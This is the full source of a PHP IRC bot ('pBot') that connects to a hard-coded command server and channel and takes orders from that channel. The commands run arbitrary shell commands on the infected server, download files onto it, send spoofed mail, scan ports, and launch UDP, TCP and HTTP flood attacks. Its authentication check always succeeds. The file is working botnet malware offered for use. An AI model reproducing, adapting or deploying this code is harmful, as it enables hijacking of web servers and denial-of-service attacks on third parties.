<?php
	set_time_limit(0);
	error_reporting(0);
	 
	class pBot {
		var $config = array(
			"server"=> "134.119.26.68",
			"port"=> 6667,
			"pass"=> "",
			"prefix"=> "",
			"maxrand"=> 15,
			"chan"=> "#gonnaraped3",
			"key"=> "1587",
			"modes"=> "+p",
			"password"=> "",
			"trigger"=> ".",
			"hostauth"=> "*"
		);
		
		var $users = array();
		function start() {
			if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30)))
			$this->start();
			$ident = "dupek";
			$alph = range("a","z");
			for($i=0;$i<$this->config['maxrand'];$i++)
			$ident .= $alph[rand(0,25)];
			if(strlen($this->config['pass'])>0)
			$this->send("PASS ".$this->config['pass']);
			$this->send("USER $ident 127.0.0.1 localhost :$ident");
			$this->set_nick();
			$this->main();
		}
		
		function main() {
			while(!feof($this->conn)) {
				$this->buf = trim(fgets($this->conn, 2048));
				$cmd = explode(" ",$this->buf);
				
				if(substr($this->buf,0,6)=="PING :") {
					$this->send("PONG :".substr($this->buf,6));
				}
				
				if(isset($cmd[1]) && $cmd[1] =="001") {
					$this->send("MODE ".$this->nick." ".$this->config['modes']);
					$this->join($this->config['chan'],$this->config['key']);
				}
				
				if(isset($cmd[1]) && $cmd[1]=="433") {
					$this->set_nick();
				}
				
				if($this->buf != $old_buf) {
					$mcmd = array();
					$msg = substr(strstr($this->buf," :"),2);
					$msgcmd = explode(" ",$msg);
					$nick = explode("!",$cmd[0]);
					$vhost = explode("@",$nick[1]);
					$vhost = $vhost[1];
					$nick = substr($nick[0],1);
					$host = $cmd[0];
					
					if($msgcmd[0]==$this->nick) {
						for($i=0;$i<count($msgcmd);$i++)
						$mcmd[$i] = $msgcmd[$i+1];
					} else {
						for($i=0;$i<count($msgcmd);$i++)
						$mcmd[$i] = $msgcmd[$i];
					}
					
					if(count($cmd)>2) {
						switch($cmd[1]) {
							case "PRIVMSG":
								if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == "*")) {
								} elseif($this->is_logged_in($host)) {
									if(substr($mcmd[0],0,1)==".") {
										switch(substr($mcmd[0],1)) {
											case "restart":
												$this->send("QUIT :restart");
												fclose($this->conn);
												$this->start();
												break;
												
											case "mail":
												if(count($mcmd)>4) {
													$header = "From: <".$mcmd[2].">";
													if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header)) {
														$this->privmsg($this->config['chan'],"[Mail] Mails can't be send.");
													} else {
														$this->privmsg($this->config['chan'],"[Mail] Mails was send to: ".$mcmd[1].".");
													}
												}
												break;
												
										case "dns":
											if(isset($mcmd[1])) {
												$ip = explode(".",$mcmd[1]);
												if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) {
													$this->privmsg($this->config['chan'],"[DNS] ".$mcmd[1]." => ".gethostbyaddr($mcmd[1]));
												} else {
													$this->privmsg($this->config['chan'],"[DNS] ".$mcmd[1]." => ".gethostbyname($mcmd[1]));
												}
											}
											break;
											
										case "url":
											$this->privmsg($this->config['chan'],"[Bot Url] http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."]");
											break;
											
										case "info":
											$this->privmsg($this->config['chan'],"[Server Information] We will add this Feature.");
											break;
											
										case "bot":
											$this->privmsg($this->config['chan'],"[Bot Information] Bot by Aerotos v3.3");
											break;
																					
										case "rndnick":
											$this->set_nick();
											break;
											
										case "ipaddr":
											$ip = $_SERVER['SERVER_ADDR'];
											$this->privmsg($this->config['chan'], "[Intern-Address] $ip");
											break;
											
										case "openurl":
											if(count($mcmd) > 1) {
												$url = $mcmd[1];
												file_get_contents($url);
												$this->privmsg($this->config['chan'], "[OpenUrl] Request was send to ".$url);
											} else {
												$this->privmsg($this->config['chan'], "[OpenUrl] Please use .openurl <url>.");
											}
											break;
											
										case "openurlflood":
											if(count($mcmd) > 2) {
												$url = $mcmd[1];
												$time = $mcmd[2];
												$endtime = time() + $time;
												
												$this->privmsg($this->config['chan'], "[OpenUrl Flood] Requestflood was start on ".$url." for ".$time." seconds.");
												while(time() < $endtime) {
													file_get_contents($url);
												}
												
												$this->privmsg($this->config['chan'], "[OpenUrl Flood] Requestflood was end on ".$url.".");
											} else {
												$this->privmsg($this->config['chan'], "[OpenUrl Flood] Please use .openurlflood <url> <time>.");
											}
											break;
										
										case "exec":
											$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
											$exec = shell_exec($command);
											$ret = explode("\n",$exec);
											$this->privmsg($this->config['chan'],"[Execute] $command.");
											for($i=0;$i<count($ret);$i++)
											if($ret[$i]!=NULL)
											$this->privmsg($this->config['chan']," : ".trim($ret[$i]));
											break;
										
										case "pscan":
											if(count($mcmd) > 2) {
											if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15))
											$this->privmsg($this->config['chan'],"[PortScanner] ".$mcmd[1].":".$mcmd[2]." is
											 
											\2open\2");
											else
											$this->privmsg($this->config['chan'],"[PortScanner] ".$mcmd[1].":".$mcmd[2]." is
											 
											\2closed\2");
											}
											break;
											
										case "download":
											if(count($mcmd) > 2) {
												if(!$fp = fopen($mcmd[2],"w")) {
													$this->privmsg($this->config['chan'],"[Download] The Download was failed.");
												} else {
													if(!$get = file($mcmd[1])) {
														$this->privmsg($this->config['chan'],"[Download] The Download was failed.");
													} else {
														for($i=0;$i<=count($get);$i++) {
															fwrite($fp,$get[$i]);
														}
														$this->privmsg($this->config['chan'],"[Download] Downloaded ".$mcmd[1]." and saved it as ".$mcmd[2].".");
													}
													fclose($fp);
												}
											}
											break;
											
										case "die":
											$this->send("QUIT :$nick has killing me");
											fclose($this->conn);
											exit;
										
										case "udpflood":
											if(count($mcmd)>4) {
												$this->udpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4]);
											}
											break;

										case "tcpflood":
											if(count($mcmd)>4) {
												$this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4]);
											}
											break;
											
										case "httpflood":
											if(count($mcmd)>3) {
												$this->httpflood($mcmd[1],$mcmd[2],$mcmd[3]);
											}
											break;
										}
									}
							}
							break;
						}
					}
				}
				$old_buf = $this->buf;
			}
			$this->start();
		}
		
		function send($msg) {
			fwrite($this->conn,"$msg\r\n");
		}
		
		function join($chan,$key=NULL) {
			$this->send("JOIN $chan $key");
		}
		
		function privmsg($to,$msg) {
			$this->send("PRIVMSG $to :$msg");
		}
		
		function is_logged_in($host) {
			return 1;
		}
		
		function log_in($host) {
			$this->users[$host] = true;
		}
		
		function log_out($host) {
			return 1;
		}
		
		function set_nick() {
			$this->nick = $this->config['prefix']."[".php_uname("s")."]";
		
			if(isset($_SERVER['SERVER_SOFTWARE'])) {
				if(strstr(strtolower($_SERVER['SERVER_SOFTWARE']), "apache")) {
					$this->nick .= "[A]";
				} elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']), "iis")) {
					$this->nick .= "[I]";
				} elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']), "xitami")) {
					$this->nick .= "[X]";
				} elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']), "nginx")) {
					$this->nick .= "[N]";
				} else {
					$this->nick .= "[U]";
				}
			}
		
			for($i=0;$i<$this->config['maxrand'];$i++)
			$this->nick .= mt_rand(0,9);
			$this->send("NICK ".$this->nick);
		}
		
		function udpflood($host, $port, $size, $time) {
			if(isset($host) AND isset($port) AND isset($size) AND isset($time)) {
				$packet = "";
				for($i = 0; $i < $size; $i++) {
					$packet .= rand(0, 9);
				}
				
				$this->privmsg($this->config['chan'], "[UdpFlood] Attacking $host on Port $port with $size Byte Packets for $time seconds.");
				$endtime = time() + $time;
				
				while(time() < $endtime) {
					$fp = fsockopen("udp://$host", $port, $errno, $errstr, 1);
					if($fp) {
						fwrite($fp, $packet);
					}
					fclose($fp);
				}
				
				$this->privmsg($this->config['chan'], "[UdpFlood] Success Attack $host on Port $port with $size Byte Packets for $time Seconds.");
				return true;
			}
			return false;
		}
		
		function tcpflood($host, $port, $size, $time) {
			if(isset($host) AND isset($port) AND isset($size) AND isset($time)) {
				$packet = "";
				for($i = 0; $i < $size; $i++) {
					$packet .= rand(0, 9);
				}
				
				$this->privmsg($this->config['chan'], "[TcpFlood] Attacking $host on Port $port with $size Byte Packets for $time seconds.");
				$endtime = time() + $time;
				
				while(time() < $endtime) {
					$fp = fsockopen("tcp://$host", $port, $errno, $errstr, 1);
					if($fp) {
						fwrite($fp, $packet);
					}
					fclose($fp);
				}
				
				$this->privmsg($this->config['chan'], "[TcpFlood] Success Attack $host on Port $port with $size Byte Packets for $time seconds.");
				return true;
			}
			return false;
		}
		
		function httpflood($url, $path, $time) {
			if(isset($url) AND isset($path) AND isset($time)) {
				$endtime = time() + $time;
				
				$this->privmsg($this->config['chan'], "[HttpFlood] Attacking $url/$path for $time Seconds.");
				while(time() < $endtime) {
					$fp = fsockopen($url, 80, $errno, $errstr, 1);
					if($fp) {
						$out = "GET /".$path." HTTP/1.1\r\n";
						$out .= "url: ".$url."\r\n";
						$out .= "Keep-Alive: 300\r\n";
						$out .= "Connection: keep-alive\r\n\r\n";
						fwrite($fp, $out);
					}
					fclose($fp);
				}
				
				$this->privmsg($this->config['chan'], "[HttpFlood] Success Attack $url/$path for $time Seconds.");
				return true;
			}
			return false;
		}
	}
	 
	$bot = new pBot;
	$bot->start();
?>